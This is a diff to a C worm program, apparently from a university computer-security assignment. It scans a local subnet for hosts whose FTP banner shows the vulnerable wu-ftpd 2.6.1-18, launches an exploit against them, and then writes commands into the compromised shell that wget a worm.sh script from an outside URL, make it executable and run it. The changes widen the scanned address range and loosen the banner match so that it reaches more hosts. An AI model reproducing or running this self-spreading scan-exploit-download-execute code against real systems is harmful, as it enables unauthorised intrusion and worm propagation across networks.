@@ -63,14 +63,14 @@ int main(int argc, char *argv[]) {
     int ipaddr;
     char *ips;
     char *own_ip;
+    int start_ip;
 
     // own_ip = malloc(IP_LENGTH*sizeof(char));
     ip = malloc(IP_LENGTH*sizeof(char));
 
     own_ip = showips();
-    printf("own_ip: %s\n", own_ip);
     strcpy(ip, own_ip);
-    printf("ip: %s\n", ip);
+
     // return(0);
 
     // strcpy(ip, "192.168.1.110");
@@ -84,15 +84,25 @@ int main(int argc, char *argv[]) {
         strcat(subnet, ".");
         i++;
     }
+
+    if (argc == 2) {
+        start_ip = atoi(argv[1]);
+    } else {
+        start_ip = atoi(token);
+    }
+
     printf("own_ip: %s\n", own_ip);
     ip = malloc(IP_LENGTH*sizeof(char));
     ips = malloc(3*sizeof(char));
-    for (ipaddr=100; ipaddr<=110; ipaddr++) {
+    for (ipaddr=start_ip; ipaddr<=254; ipaddr++) {
 
-        strcpy(ip, subnet);
-        sprintf(ips, "%d", ipaddr);
-        strncat(ip, ips, sizeof(ip) - strlen(ip) - 1);
+        sprintf(ip, "%s%d", subnet, ipaddr);
+
+        // strcpy(ip, subnet);
+        // sprintf(ips, "%d", ipaddr);
+        // strncat(ip, ips, sizeof(ip) - strlen(ip) - 1);
         
+        printf("ip: %s\n", ip);
         // check if IP is itself
         if (!strcmp(ip, own_ip)) {
             printf("Skipping %s\n", ip);
@@ -196,7 +206,7 @@ int main(int argc, char *argv[]) {
                         printf("%s\t%d\t%s\n", ip, port, buffer);
                     }
 
-                    if (strstr(buffer,"220 redhat1 FTP server (Version wu-2.6.1-18) ready.") != NULL) {
+                    if (strstr(buffer,"FTP server (Version wu-2.6.1-18) ready.") != NULL) {
                         int argc = 4;
                         char *argv[4] = {
                             "exploiter",
@@ -272,23 +282,19 @@ void cshell (int sock) {
         char    buf2[2];
         fd_set  rfds;
 
-        char *commands[8] = {   
-                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n", 
-                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n", 
-                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/makefile\n",
+        char *commands[3] = {   
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/worm.sh\n",
                                 "chmod +x worm.sh\n",
-                                "./worm.sh\n"
-        }; //, "gcc portscan.c -o portscan", "./portscan"};
-        // int buffsize[7] = {3, 4, 5, 3, 8};
+                                "./worm.sh > worm.out\n"
+        };
 
         int i;
-        for(i=0; i<6; i++) {
+        for(i=0; i<3; i++) {
             printf("sending command '%s", commands[i]);
             write (sock, commands[i], strlen(commands[i]));
             sleep(1);
-            if ((i == 2) || (i==7)) {
-                sleep(20);
+            if (i == 1) {
+                sleep(10);
             }
         }
         
@@ -343,7 +349,7 @@ char *showips() {
     /* I want to get an IPv4 IP address */
     ifr.ifr_addr.sa_family = AF_INET;
 
-    /* I want IP address attached to "eth0" */
+    /* I want IP address attached to "eth0" or "en0" */
     strncpy(ifr.ifr_name, NETWORK_INTERFACE, IFNAMSIZ-1);
 
     ioctl(fd, SIOCGIFADDR, &ifr);
